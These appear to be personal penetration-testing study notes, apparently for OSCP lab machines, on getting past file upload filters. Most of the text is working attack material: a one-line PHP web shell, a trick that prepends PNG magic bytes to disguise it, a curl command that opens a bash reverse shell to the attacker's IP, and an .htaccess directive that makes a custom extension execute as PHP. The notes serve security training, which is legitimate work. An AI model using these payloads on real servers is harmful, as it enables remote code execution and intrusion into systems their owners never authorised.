```
vim shell.php.png
```

```
<?php
system($_REQUEST['cmd']);
?>
```

```
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
cat shell.php.png >> mime_shell.php.png
```

---

Upload. Access the image.

---

Curl a reverse shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"' http://10.10.10.146/uploads/10_10_14_2.php.png`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

## File Upload Bypass via .htaccess (php inclusion)

Upload a normal text file and intercept the request with burp.

To exploit the file upload bypass vulnerability, we renamed the malicious file to `.htaccess` and modified its content to include the following directive:

```
AddType application/x-httpd-php .php16
```

![[Pasted image 20260817214618.png]]

This allows file.php16 to be uploaded

Then upload phpreverseshell.php onto file upload button

Intercept in burpsuite and change the filename to phpreverseshell.php16

This will make pfpreverseshell.php16 appear in /uploads